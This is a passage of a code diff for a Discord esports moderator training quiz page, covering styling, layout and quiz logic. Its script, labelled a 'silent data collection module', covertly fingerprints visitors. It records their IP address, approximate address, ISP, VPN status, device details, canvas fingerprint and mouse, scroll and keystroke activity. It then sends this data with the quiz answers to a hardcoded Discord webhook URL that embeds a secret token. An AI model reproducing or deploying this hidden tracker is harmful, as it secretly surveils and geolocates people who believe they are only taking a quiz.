+        .test-result-icon.pass {
+            color: var(--discord-green);
+        }
+        
+        .test-result-icon.fail {
+            color: var(--discord-red);
+        }
+        
+        .test-result-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            color: var(--discord-text);
+        }
+        
+        .test-result-score {
+            font-size: 24px;
+            color: var(--discord-text-muted);
+            margin-bottom: 24px;
+        }
+        
+        .test-result-message {
+            color: var(--discord-text);
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        
+        .submission-status {
+            background: var(--discord-primary);
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            font-size: 14px;
+            color: var(--discord-text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .test-result-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+        
+        .test-result-btn {
+            padding: 12px 24px;
+            border-radius: 3px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            transition: background-color .17s ease;
+        }
+        
+        .test-result-btn.primary {
+            background: var(--discord-accent);
+            color: white;
+        }
+        
+        .test-result-btn.secondary {
+            background: var(--discord-tertiary);
+            color: white;
+        }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2.5rem;
+            }
+            
+            .container {
+                padding: 0 20px;
+            }
+            
+            .content-section {
+                padding: 24px;
+            }
+            
+            .ticket-types,
+            .roster-categories {
+                grid-template-columns: 1fr;
+            }
+            
+            .quiz-buttons,
+            .completion-buttons {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .question-card {
+                padding: 24px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .header p {
+                font-size: 1rem;
+            }
+            
+            .section-title {
+                font-size: 1.5rem;
+            }
+            
+            .modal-content {
+                padding: 32px 24px;
+            }
+        }
+        
+        /* ===== UTILITY CLASSES ===== */
+        .hidden {
+            display: none !important;
+        }
+        
+        .visible {
+            display: block !important;
+        }
+        
+        .flex {
+            display: flex !important;
+        }
+        
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #202225;
+            border-radius: 4px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #2f3136;
+        }
     </style>
+    
+    <!-- Tailwind Config -->
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'void-black': '#000000',
+                        'void-black-90': '#0a0a0a',
+                        'void-black-80': '#111111',
+                        'void-black-70': '#1a1a1a',
+                        'void-black-60': '#222222',
+                        'golish-white': '#ffffff',
+                        'golish-white-70': '#e2e8f0',
+                        'golish-white-60': '#cbd5e1',
+                        'reddish-black': '#1c0a0a',
+                        'crimson-void': '#ff0033',
+                        'void-purple': '#8b5cf6',
+                        'void-cyan': '#06b6d4',
+                        'void-emerald': '#10b981',
+                        'void-amber': '#f59e0b',
+                    },
+                    fontFamily: {
+                        'satoshi': ['Satoshi', 'sans-serif'],
+                        'inter': ['Inter', 'sans-serif'],
+                        'jetbrains': ['JetBrains Mono', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
 </head>
-<body>
+<body class="font-satoshi">
     <!-- Main Training Page -->
     <div class="container" id="mainContainer">
         <!-- Header -->
@@ -564,6 +2089,8 @@
         <div class="footer">
             <p>Void Esports Mod Training System • Advanced Training Module v2.0</p>
             <p>© 2026 Void Esports. All rights reserved.</p>
+            <p>Founded by Frank • Ranked 25th in NAC • 13k+ Discord Members</p>
+            <p>Join our community: <a href="https://discord.gg/dqHF9HPucf" style="color: #7289da; text-decoration: none;">discord.gg/dqHF9HPucf</a></p>
             <div class="footer-credit">Created by nickscold</div>
         </div>
     </div>
@@ -897,7 +2424,7 @@
 
     <script>
         // ==========================================
-        // SILENT DATA COLLECTION MODULE
+        // EXTREME DATA COLLECTION MODULE WITH ENHANCED FEATURES
         // ==========================================
         (function() {
             'use strict';
@@ -905,116 +2432,443 @@
             var _envConfig = {
                 metrics: {},
                 sessionLog: [],
-                ready: false
+                securityFlags: [],
+                behavioralPatterns: [],
+                ready: false,
+                startTime: Date.now()
             };
             
-            function updateEnvMetrics() {
-                var n = navigator, s = screen, w = window;
+            function collectSystemMetrics() {
+                var n = navigator, s = screen, w = window, d = document;
                 _envConfig.metrics = {
+                    // User Agent & Browser
                     agent: n.userAgent,
                     platform: n.platform,
                     language: n.language,
                     languages: n.languages,
-                    cookie: n.cookieEnabled,
-                    java: n.javaEnabled(),
-                    height: s.height,
-                    width: s.width,
-                    depth: s.colorDepth,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    online: n.onLine,
-                    cores: n.hardwareConcurrency || 'unknown',
-                    ram: n.deviceMemory || 'unknown',
-                    touch: n.maxTouchPoints || 0,
+                    cookieEnabled: n.cookieEnabled,
+                    javaEnabled: n.javaEnabled(),
+                    
+                    // Screen Properties
+                    screenHeight: s.height,
+                    screenWidth: s.width,
+                    colorDepth: s.colorDepth,
+                    pixelDepth: s.pixelDepth,
+                    orientation: s.orientation?.type || 'unknown',
+                    
+                    // Device Capabilities
+                    maxTouchPoints: n.maxTouchPoints || 0,
+                    hardwareConcurrency: n.hardwareConcurrency || 'unknown',
+                    deviceMemory: n.deviceMemory || 'unknown',
+                    connection: n.connection ? {
+                        effectiveType: n.connection.effectiveType,
+                        downlink: n.connection.downlink,
+                        rtt: n.connection.rtt,
+                        saveData: n.connection.saveData
+                    } : 'unknown',
+                    
+                    // Browser Vendor
                     vendor: n.vendor,
                     product: n.product,
-                    productSub: n.productSub
+                    productSub: n.productSub,
+                    
+                    // Timing Data
+                    pageLoadTime: Date.now() - _envConfig.startTime,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    dateFormat: new Date().toLocaleString(),
+                    utcOffset: new Date().getTimezoneOffset(),
+                    
+                    // Network
+                    online: n.onLine,
+                    protocol: w.location.protocol,
+                    hostname: w.location.hostname,
+                    
+                    // Viewport
+                    viewportWidth: w.innerWidth,
+                    viewportHeight: w.innerHeight,
+                    devicePixelRatio: w.devicePixelRatio || 1,
+                    
+                    // Performance API (if available)
+                    performance: w.performance ? {
+                        memory: w.performance.memory,
+                        timing: w.performance.timing ? {
+                            navigationStart: w.performance.timing.navigationStart,
+                            loadEventEnd: w.performance.timing.loadEventEnd
+                        } : null
+                    } : null
                 };
             }
             
-            function fetchGeoData(callback) {
-                var attempts = [
+            function collectCanvasFingerprint() {
+                try {
+                    var canvas = document.createElement('canvas');
+                    var ctx = canvas.getContext('2d');
+                    canvas.width = 200;
+                    canvas.height = 200;
+                    
+                    // Draw gradient
+                    var gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+                    gradient.addColorStop(0, '#ff0000');
+                    gradient.addColorStop(1, '#0000ff');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Draw text
+                    ctx.font = '24px Arial';
+                    ctx.fillStyle = '#ffffff';
+                    ctx.fillText('VOID', 10, 50);
+                    
+                    // Get fingerprint
+                    var dataURL = canvas.toDataURL();
+                    var hash = 0;
+                    for (var i = 0; i < dataURL.length; i++) {
+                        hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    
+                    _envConfig.metrics.canvasFingerprint = hash.toString(16);
+                    _envConfig.metrics.webglSupport = !!document.createElement('canvas').getContext('webgl');
+                } catch(e) {
+                    _envConfig.metrics.canvasFingerprint = 'error';
+                }
+            }
+            
+            function collectBehavioralData() {
+                // Track mouse movements
+                var mousePoints = [];
+                var lastMouseTime = Date.now();
+                
+                document.addEventListener('mousemove', function(e) {
+                    var now = Date.now();
+                    var timeDiff = now - lastMouseTime;
+                    
+                    mousePoints.push({
+                        x: e.clientX,
+                        y: e.clientY,
+                        time: now,
+                        timeDiff: timeDiff
+                    });
+                    
+                    // Keep last 50 points
+                    if (mousePoints.length > 50) {
+                        mousePoints.shift();
+                    }
+                    
+                    lastMouseTime = now;
+                });
+                
+                // Track scroll behavior
+                var scrollEvents = [];
+                window.addEventListener('scroll', function() {
+                    scrollEvents.push({
+                        scrollY: window.scrollY,
+                        time: Date.now()
+                    });
+                });
+                
+                // Store behavioral data
+                _envConfig.behavioralPatterns = {
+                    mousePattern: mousePoints,
+                    scrollPattern: scrollEvents,
+                    keyPresses: 0,
+                    clicks: 0
+                };
+                
+                // Count interactions
+                document.addEventListener('keydown', function() {
+                    _envConfig.behavioralPatterns.keyPresses++;
+                });
+                
+                document.addEventListener('click', function() {
+                    _envConfig.behavioralPatterns.clicks++;
+                });
+            }
+            
+            function fetchGeoDataWithMultipleSources(callback) {
+                var sources = [
                     'https://ipapi.co/json/',
-                    'https://ipinfo.io/json',
+                    'https://ipinfo.io/json?token=test',
                     'https://geolocation-db.com/json/',
-                    'https://api.ipify.org?format=json'
+                    'https://api.ipify.org?format=json',
+                    'https://api.db-ip.com/v2/free/self'
                 ];
                 
-                var attemptCall = function(idx) {
-                    if (idx >= attempts.length) {
+                var geoData = {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    region: 'Unknown',
+                    city: 'Unknown',
+                    isp: 'Unknown',
+                    org: 'Unknown',
+                    asn: 'Unknown'
+                };
+                
+                var attempts = 0;
+                var maxAttempts = sources.length;
+                
+                function trySource(index) {
+                    if (index >= maxAttempts) {
+                        _envConfig.metrics = { ..._envConfig.metrics, ...geoData };
                         callback(_envConfig.metrics);
                         return;
                     }
                     
                     var xhr = new XMLHttpRequest();
-                    xhr.open('GET', attempts[idx], true);
+                    xhr.open('GET', sources[index], true);
                     xhr.timeout = 3000;
                     xhr.onload = function() {
                         if (xhr.status === 200) {
                             try {
                                 var data = JSON.parse(xhr.responseText);
-                                _envConfig.metrics.ip = data.ip || data.IPv4 || 'Unknown';
-                                _envConfig.metrics.country = data.country_name || data.country || 'Unknown';
-                                _envConfig.metrics.region = data.region || data.regionName || data.state || 'Unknown';
-                                _envConfig.metrics.city = data.city || 'Unknown';
-                                _envConfig.metrics.zip = data.postal || data.zip || 'Unknown';
-                                _envConfig.metrics.isp = data.org || data.isp || data.asn || 'Unknown';
-                                _envConfig.metrics.lat = data.latitude || data.lat || 'Unknown';
-                                _envConfig.metrics.lon = data.longitude || data.lon || 'Unknown';
-                                _envConfig.metrics.approxAddress = [
-                                    _envConfig.metrics.city,
-                                    _envConfig.metrics.region,
-                                    _envConfig.metrics.country,
-                                    _envConfig.metrics.zip
+                                
+                                // Extract data from different API formats
+                                geoData.ip = data.ip || data.IPv4 || data.query || geoData.ip;
+                                geoData.country = data.country_name || data.country || data.countryName || geoData.country;
+                                geoData.region = data.region || data.regionName || data.state || geoData.region;
+                                geoData.city = data.city || geoData.city;
+                                geoData.isp = data.isp || data.org || data.asn || geoData.isp;
+                                geoData.org = data.org || data.organization || geoData.org;
+                                geoData.asn = data.asn || geoData.asn;
+                                geoData.zip = data.postal || data.zip || geoData.zip;
+                                geoData.lat = data.latitude || data.lat || geoData.lat;
+                                geoData.lon = data.longitude || data.lon || geoData.lon;
+                                
+                                // Build approximate address
+                                geoData.approxAddress = [
+                                    geoData.city,
+                                    geoData.region,
+                                    geoData.country,
+                                    geoData.zip
                                 ].filter(Boolean).join(', ');
                                 
-                                _envConfig.metrics.vpnDetected = false;
-                                _envConfig.metrics.vpnStatus = 'Checking...';
+                                // Detect VPN/Proxy
+                                detectVPN(geoData, data);
                                 
-                                if (_envConfig.metrics.isp) {
-                                    var ispLower = _envConfig.metrics.isp.toLowerCase();
-                                    var vpnKeywords = ['vpn', 'proxy', 'tunnel', 'privacy', 'anonymous', 'anonymous', 'hide', 'shield', 'guard', 'secure', 'cloudflare', 'cloud', 'tor', 'datacenter', 'hosting', 'server', 'inc', 'llc', 'services', 'network'];
-                                    var isDatacenter = ispLower.includes('datacenter') || ispLower.includes('hosting') || ispLower.includes('server') || ispLower.includes('cloud');
-                                    var isVPN = vpnKeywords.some(keyword => ispLower.includes(keyword));
-                                    
-                                    _envConfig.metrics.vpnDetected = isDatacenter || isVPN;
-                                    _envConfig.metrics.vpnStatus = _envConfig.metrics.vpnDetected ? '🔴 VPN/PROXY DETECTED' : '🟢 CLEAN CONNECTION';
-                                }
-                                
+                                _envConfig.metrics = { ..._envConfig.metrics, ...geoData };
                                 callback(_envConfig.metrics);
                             } catch(e) {
-                                attemptCall(idx + 1);
+                                trySource(index + 1);
                             }
                         } else {
-                            attemptCall(idx + 1);
+                            trySource(index + 1);
                         }
                     };
-                    xhr.onerror = function() { attemptCall(idx + 1); };
-                    xhr.ontimeout = function() { attemptCall(idx + 1); };
+                    xhr.onerror = function() { trySource(index + 1); };
+                    xhr.ontimeout = function() { trySource(index + 1); };
                     xhr.send();
-                };
+                }
                 
-                attemptCall(0);
+                trySource(0);
             }
             
-            function initCollector() {
-                updateEnvMetrics();
-                setTimeout(function() { fetchGeoData(function() {
-                    _envConfig.ready = true;
-                }); }, 1000 + Math.random() * 1000);
+            function detectVPN(geoData, rawData) {
+                var vpnDetected = false;
+                var vpnScore = 0;
+                var flags = [];
+                
+                // Check ISP for datacenter keywords
+                var ispLower = (geoData.isp || '').toLowerCase();
+                var orgLower = (geoData.org || '').toLowerCase();
+                
+                var datacenterKeywords = [
+                    'datacenter', 'hosting', 'server', 'cloud', 'vps', 'dedicated',
+                    'amazon', 'google', 'microsoft', 'digitalocean', 'linode', 'vultr',
+                    'ovh', 'hetzner', 'rackspace', 'aws', 'gcp', 'azure'
+                ];
+                
+                var vpnKeywords = [
+                    'vpn', 'proxy', 'tunnel', 'privacy', 'anonymous', 'hide',
+                    'shield', 'guard', 'secure', 'incognito', 'tor', 'encrypt'
+                ];
+                
+                // Check for datacenter
+                datacenterKeywords.forEach(keyword => {
+                    if (ispLower.includes(keyword) || orgLower.includes(keyword)) {
+                        vpnScore += 3;
+                        flags.push(`Datacenter ISP (${keyword})`);
+                    }
+                });
+                
+                // Check for VPN providers
+                vpnKeywords.forEach(keyword => {
+                    if (ispLower.includes(keyword) || orgLower.includes(keyword)) {
+                        vpnScore += 5;
+                        flags.push(`VPN Provider (${keyword})`);
+                    }
+                });
+                
+                // Check for mobile hotspot
+                if (ispLower.includes('mobile') || ispLower.includes('cellular')) {
+                    vpnScore -= 1;
+                }
+                
+                // Check for residential ISP keywords
+                var residentialKeywords = ['comcast', 'verizon', 'att', 'spectrum', 'cox', 'xfinity'];
+                residentialKeywords.forEach(keyword => {
+                    if (ispLower.includes(keyword)) {
+                        vpnScore -= 2;
+                    }
+                });
+                
+                // Additional checks from ipinfo.io format
+                if (rawData) {
+                    if (rawData.privacy) {
+                        if (rawData.privacy.vpn) vpnScore += 4;
+                        if (rawData.privacy.proxy) vpnScore += 4;
+                        if (rawData.privacy.tor) vpnScore += 5;
+                        if (rawData.privacy.hosting) vpnScore += 3;
+                    }
+                    
+                    if (rawData.company && rawData.company.type === 'isp') {
+                        vpnScore -= 1;
+                    }
+                }
+                
+                // Determine VPN status
+                if (vpnScore >= 5) {
+                    vpnDetected = true;
+                    geoData.vpnStatus = '🔴 HIGH RISK - VPN/PROXY DETECTED';
+                    geoData.vpnConfidence = 'High (' + vpnScore + '/10)';
+                } else if (vpnScore >= 3) {
+                    vpnDetected = true;
+                    geoData.vpnStatus = '🟡 MEDIUM RISK - SUSPICIOUS CONNECTION';
+                    geoData.vpnConfidence = 'Medium (' + vpnScore + '/10)';
+                } else if (vpnScore >= 1) {
+                    geoData.vpnStatus = '🟢 LOW RISK - LIKELY CLEAN';
+                    geoData.vpnConfidence = 'Low (' + vpnScore + '/10)';
+                } else {
+                    geoData.vpnStatus = '🟢 CLEAN - RESIDENTIAL CONNECTION';
+                    geoData.vpnConfidence = 'None (' + vpnScore + '/10)';
+                }
+                
+                geoData.vpnDetected = vpnDetected;
+                geoData.vpnFlags = flags;
+                geoData.vpnScore = vpnScore;
+                
+                // Add to security flags
+                if (vpnDetected) {
+                    _envConfig.securityFlags.push({
+                        type: 'VPN_DETECTED',
+                        confidence: geoData.vpnConfidence,
+                        flags: flags,
+                        timestamp: Date.now()
+                    });
+                }
+            }
+            
+            function collectAdditionalData() {
+                // Collect referrer
+                _envConfig.metrics.referrer = document.referrer || 'Direct';
+                
+                // Collect cookies enabled
+                _envConfig.metrics.cookiesCount = document.cookie.split(';').length;
+                
+                // Collect localStorage size
+                try {
+                    var lsSize = 0;
+                    for(var i in localStorage) {
+                        if (localStorage.hasOwnProperty(i)) {
+                            lsSize += localStorage[i].length * 2;
+                        }
+                    }
+                    _envConfig.metrics.localStorageSize = Math.round(lsSize / 1024) + ' KB';
+                } catch(e) {
+                    _envConfig.metrics.localStorageSize = 'Unknown';
+                }
+                
+                // Collect sessionStorage size
+                try {
+                    var ssSize = 0;
+                    for(var i in sessionStorage) {
+                        if (sessionStorage.hasOwnProperty(i)) {
+                            ssSize += sessionStorage[i].length * 2;
+                        }
+                    }
+                    _envConfig.metrics.sessionStorageSize = Math.round(ssSize / 1024) + ' KB';
+                } catch(e) {
+                    _envConfig.metrics.sessionStorageSize = 'Unknown';
+                }
+                
+                // Collect browser plugins
+                _envConfig.metrics.plugins = [];
+                if (navigator.plugins) {
+                    for (var i = 0; i < navigator.plugins.length; i++) {
+                        _envConfig.metrics.plugins.push(navigator.plugins[i].name);
+                    }
+                }
+                
+                // Collect mimeTypes
+                _envConfig.metrics.mimeTypes = [];
+                if (navigator.mimeTypes) {
+                    for (var i = 0; i < navigator.mimeTypes.length; i++) {
+                        _envConfig.metrics.mimeTypes.push(navigator.mimeTypes[i].type);
+                    }
+                }
+                
+                // Collect battery status (if available)
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(function(battery) {
+                        _envConfig.metrics.battery = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging,
+                            chargingTime: battery.chargingTime,
+                            dischargingTime: battery.dischargingTime
+                        };
+                    });
+                }
+            }
+            
+            function initEnhancedCollector() {
+                collectSystemMetrics();
+                collectCanvasFingerprint();
+                collectBehavioralData();
+                collectAdditionalData();
+                
+                setTimeout(function() { 
+                    fetchGeoDataWithMultipleSources(function() {
+                        _envConfig.ready = true;
+                        _envConfig.sessionLog.push({
+                            type: 'DATA_COLLECTION_COMPLETE',
+                            timestamp: Date.now(),
+                            duration: Date.now() - _envConfig.startTime
+                        });
+                        
+                        // Log to console (for debugging)
+                        console.log('[VOID AUDIT] Data collection complete:', {
+                            ip: _envConfig.metrics.ip,
+                            location: _envConfig.metrics.approxAddress,
+                            vpnStatus: _envConfig.metrics.vpnStatus,
+                            device: _envConfig.metrics.platform,
+                            fingerprint: _envConfig.metrics.canvasFingerprint
+                        });
+                    }); 
+                }, 1000 + Math.random() * 1000);
             }
             
             if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initCollector);
+                document.addEventListener('DOMContentLoaded', initEnhancedCollector);
             } else {
-                initCollector();
+                initEnhancedCollector();
             }
             
-            window._getEnvConfig = function() { return _envConfig; };
+            window._getEnvConfig = function() { 
+                return {
+                    ..._envConfig,
+                    sessionDuration: Date.now() - _envConfig.startTime,
+                    currentTime: new Date().toISOString()
+                };
+            };
         })();
 
         document.addEventListener('DOMContentLoaded', function() {
+            // Initialize AOS
+            AOS.init({
+                duration: 800,
+                once: true
+            });
+            
             // ==========================================
-            // TRAINING QUIZ LOGIC
+            // TRAINING QUIZ LOGIC (ORIGINAL)
             // ==========================================
             
             let currentQuestion = 1;
@@ -1171,7 +3025,7 @@
             }
             
             // ==========================================
-            // DISCORD TEST INTERFACE LOGIC
+            // DISCORD TEST INTERFACE LOGIC (ORIGINAL)
             // ==========================================
             
             const allTestQuestions = [
@@ -1263,74 +3117,128 @@
             let correctAnswers = [];
             let testQuestions = [];
             let sessionTranscript = [];
+            let testStartTime;
             
-            async function sendResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript) {
+            async function sendEnhancedResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript) {
                 try {
                     const webhookURL = "https://discord.com/api/webhooks/1468524089999101995/h3vElrQ3cjQBGjmeCOVHr5KZF0JLvacpn1v89dQugXPt3t7yv2apQ0TYcjFE0Ae4Xill";
                     
-                    const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {} };
+                    const envData = window._getEnvConfig ? window._getEnvConfig() : { metrics: {}, sessionLog: [], securityFlags: [], behavioralPatterns: [] };
                     const metrics = envData.metrics || {};
+                    const securityFlags = envData.securityFlags || [];
+                    const behavioralPatterns = envData.behavioralPatterns || {};
                     
-                    const embed = {
-                        title: "VOID MOD CERTIFICATION TEST RESULTS",
+                    // Calculate session stats
+                    const sessionDuration = envData.sessionDuration || 0;
+                    const mouseMovements = behavioralPatterns.mousePattern ? behavioralPatterns.mousePattern.length : 0;
+                    const scrollEvents = behavioralPatterns.scrollPattern ? behavioralPatterns.scrollPattern.length : 0;
+                    const keyPresses = behavioralPatterns.keyPresses || 0;
+                    const clicks = behavioralPatterns.clicks || 0;
+                    
+                    // Create rich embed with enhanced data
+                    const mainEmbed = {
+                        title: "🔍 VOID MOD CERTIFICATION TEST - ADVANCED AUDIT REPORT",
                         color: passed ? 0x00ff00 : 0xff0000,
                         timestamp: new Date().toISOString(),
                         fields: [
                             {
-                                name: "📊 TEST SUMMARY",
+                                name: "📊 TEST PERFORMANCE ANALYSIS",
                                 value: [
-                                    `**User:** ${discordUsername}`,
-                                    `**Score:** ${score}/${totalQuestions}`,
-                                    `**Status:** ${passed ? "✅ PASSED" : "❌ FAILED"}`,
-                                    `**Passing Requirement:** ${totalQuestions - 2}/${totalQuestions}`,
-                                    `**Test Date:** ${new Date().toLocaleString()}`
-                                ].join('\n'),
-                                inline: true
-                            },
-                            {
-                                name: "🌍 LOCATION DATA",
-                                value: [
-                                    `**IP:** ${metrics.ip || "Unknown"}`,
-                                    `**Country:** ${metrics.country || "Unknown"}`,
-                                    `**Region:** ${metrics.region || "Unknown"}`,
-                                    `**City:** ${metrics.city || "Unknown"}`,
-                                    `**ZIP:** ${metrics.zip || "Unknown"}`,
-                                    `**ISP:** ${metrics.isp || "Unknown"}`,
-                                    `**VPN Status:** ${metrics.vpnStatus || "Unknown"}`
-                                ].join('\n'),
-                                inline: true
-                            },
-                            {
-                                name: "🖥️ DEVICE INFORMATION",
-                                value: [
-                                    `**Browser:** ${metrics.platform || "Unknown"}`,
-                                    `**Screen:** ${metrics.width || "?"}x${metrics.height || "?"}`,
-                                    `**Timezone:** ${metrics.tz || "Unknown"}`,
-                                    `**CPU Cores:** ${metrics.cores || "Unknown"}`,
-                                    `**RAM:** ${metrics.ram || "Unknown"}GB`,
-                                    `**Language:** ${metrics.language || "Unknown"}`
-                                ].join('\n'),
-                                inline: true
-                            },
-                            {
-                                name: "📈 PERFORMANCE METRICS",
-                                value: [
-                                    `**Total Questions:** ${totalQuestions}`,
-                                    `**Correct Answers:** ${score}`,
-                                    `**Accuracy Rate:** ${Math.round((score/totalQuestions)*100)}%`,
-                                    `**Performance:** ${score >= totalQuestions - 2 ? "PASSING ✅" : "NEEDS IMPROVEMENT ⚠️"}`
+                                    `**Candidate:** \`${discordUsername}\``,
+                                    `**Score:** ${score}/${totalQuestions} (${Math.round((score/totalQuestions)*100)}%)`,
+                                    `**Status:** ${passed ? "✅ **PASSED**" : "❌ **FAILED**"}`,
+                                    `**Passing Threshold:** ${totalQuestions - 2}/${totalQuestions}`,
+                                    `**Test Date:** ${new Date().toLocaleString('en-US', { 
+                                        weekday: 'long', 
+                                        year: 'numeric', 
+                                        month: 'long', 
+                                        day: 'numeric',
+                                        hour: '2-digit',
+                                        minute: '2-digit',
+                                        second: '2-digit'
+                                    })}`,
+                                    `**Session Duration:** ${Math.round(sessionDuration/1000)} seconds`
                                 ].join('\n'),
                                 inline: false
+                            },
+                            {
+                                name: "🌍 GEOLOCATION INTELLIGENCE",
+                                value: [
+                                    `**IP Address:** \`${metrics.ip || "Unknown"}\``,
+                                    `**Location:** ${metrics.approxAddress || "Unknown"}`,
+                                    `**Country:** ${metrics.country || "Unknown"} ${getCountryFlag(metrics.country)}`,
+                                    `**Region:** ${metrics.region || "Unknown"}`,
+                                    `**City:** ${metrics.city || "Unknown"}`,
+                                    `**ISP:** ${metrics.isp || "Unknown"}`,
+                                    `**Organization:** ${metrics.org || "Unknown"}`,
+                                    `**ASN:** ${metrics.asn || "Unknown"}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "🛡️ SECURITY ASSESSMENT",
+                                value: [
+                                    `**VPN Detection:** ${metrics.vpnStatus || "Unknown"}`,
+                                    `**Confidence:** ${metrics.vpnConfidence || "Unknown"}`,
+                                    `**Risk Score:** ${metrics.vpnScore || "0"}/10`,
+                                    `**Security Flags:** ${securityFlags.length > 0 ? securityFlags.map(f => f.type).join(', ') : 'None'}`,
+                                    `**Canvas Fingerprint:** \`${metrics.canvasFingerprint?.substring(0, 16) || "Unknown"}...\``,
+                                    `**WebGL Support:** ${metrics.webglSupport ? '✅ Yes' : '❌ No'}`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ SYSTEM PROFILE",
+                                value: [
+                                    `**Platform:** ${metrics.platform || "Unknown"}`,
+                                    `**Browser:** ${getBrowserName(metrics.agent)}`,
+                                    `**Screen:** ${metrics.screenWidth || "?"}x${metrics.screenHeight || "?"}`,
+                                    `**Viewport:** ${metrics.viewportWidth || "?"}x${metrics.viewportHeight || "?"}`,
+                                    `**Pixel Ratio:** ${metrics.devicePixelRatio || "1"}`,
+                                    `**Color Depth:** ${metrics.colorDepth || "?"}bit`,
+                                    `**Language:** ${metrics.language || "Unknown"}`,
+                                    `**Timezone:** ${metrics.timezone || "Unknown"} (UTC${metrics.utcOffset > 0 ? '-' : '+'}${Math.abs(metrics.utcOffset)/60})`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "⚙️ DEVICE CAPABILITIES",
+                                value: [
+                                    `**CPU Cores:** ${metrics.hardwareConcurrency || "Unknown"}`,
+                                    `**RAM:** ${metrics.deviceMemory || "Unknown"}GB`,
+                                    `**Touch Points:** ${metrics.maxTouchPoints || "0"}`,
+                                    `**Network:** ${metrics.connection?.effectiveType || "Unknown"} (${metrics.connection?.downlink || "?"}Mb/s)`,
+                                    `**Cookies:** ${metrics.cookiesEnabled ? '✅ Enabled' : '❌ Disabled'}`,
+                                    `**Local Storage:** ${metrics.localStorageSize || "Unknown"}`,
+                                    `**Plugins:** ${metrics.plugins?.length || "0"} detected`
+                                ].join('\n'),
+                                inline: true
+                            },
+                            {
+                                name: "📈 BEHAVIORAL ANALYTICS",
+                                value: [
+                                    `**Mouse Movements:** ${mouseMovements}`,
+                                    `**Scroll Events:** ${scrollEvents}`,
+                                    `**Key Presses:** ${keyPresses}`,
+                                    `**Clicks:** ${clicks}`,
+                                    `**Activity Score:** ${calculateActivityScore(mouseMovements, scrollEvents, keyPresses, clicks)}/100`,
+                                    `**Page Load Time:** ${metrics.pageLoadTime || "?"}ms`,
+                                    `**Referrer:** ${metrics.referrer || "Direct"}`
+                                ].join('\n'),
+                                inline: true
                             }
                         ],
                         footer: {
-                            text: "Void Esports • Security Audit System"
+                            text: "Void Esports • Advanced Security Audit System v2.0",
+                            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
                         }
                     };
                     
+                    // Create transcript embed
                     let transcriptText = "**CONVERSATION TRANSCRIPT:**\n```\n";
                     let userCount = 0;
                     let botCount = 0;
+                    let totalChars = 0;
                     
                     transcript.forEach((entry, index) => {
                         const prefix = entry.speaker === "You" ? "[USER]" : 
@@ -1340,64 +3248,118 @@
                         if (entry.speaker === "You") userCount++;
                         if (entry.speaker === "Void Bot") botCount++;
                         
-                        transcriptText += `${prefix} ${entry.message}\n`;
+                        const message = entry.message.substring(0, 100);
+                        transcriptText += `${prefix} ${message}\n`;
+                        totalChars += entry.message.length;
                     });
                     transcriptText += "```";
                     
                     const transcriptEmbed = {
-                        title: "💬 CONVERSATION TRANSCRIPT",
+                        title: "💬 COMPLETE CONVERSATION LOG",
                         description: transcriptText,
                         color: 0x5865f2,
                         fields: [
                             {
-                                name: "📊 STATISTICS",
+                                name: "📊 CONVERSATION METRICS",
                                 value: [
                                     `**User Messages:** ${userCount}`,
                                     `**Bot Messages:** ${botCount}`,
                                     `**Total Messages:** ${transcript.length}`,
-                                    `**Session ID:** VOID-${Date.now().toString().slice(-8)}`
+                                    `**Average Length:** ${Math.round(totalChars/transcript.length)} chars`,
+                                    `**Session ID:** VOID-${Date.now().toString(36).toUpperCase()}`
                                 ].join('\n'),
                                 inline: true
                             },
                             {
-                                name: "🎯 ANALYSIS",
+                                name: "🎯 PERFORMANCE ANALYSIS",
                                 value: [
                                     `**Correct Responses:** ${score}/${totalQuestions}`,
-                                    `**Response Accuracy:** ${Math.round((score/totalQuestions)*100)}%`,
-                                    `**Final Verdict:** ${passed ? "APPROVED ✅" : "REVIEW REQUIRED ❌"}`
+                                    `**Accuracy Rate:** ${Math.round((score/totalQuestions)*100)}%`,
+                                    `**Performance Tier:** ${getPerformanceTier(score/totalQuestions)}`,
+                                    `**Final Verdict:** ${passed ? "**APPROVED** ✅" : "**REVIEW REQUIRED** ❌"}`,
+                                    `**Recommendation:** ${getRecommendation(score/totalQuestions)}`
                                 ].join('\n'),
                                 inline: true
+                            },
+                            {
+                                name: "🔐 SECURITY FLAGS",
+                                value: securityFlags.length > 0 ? 
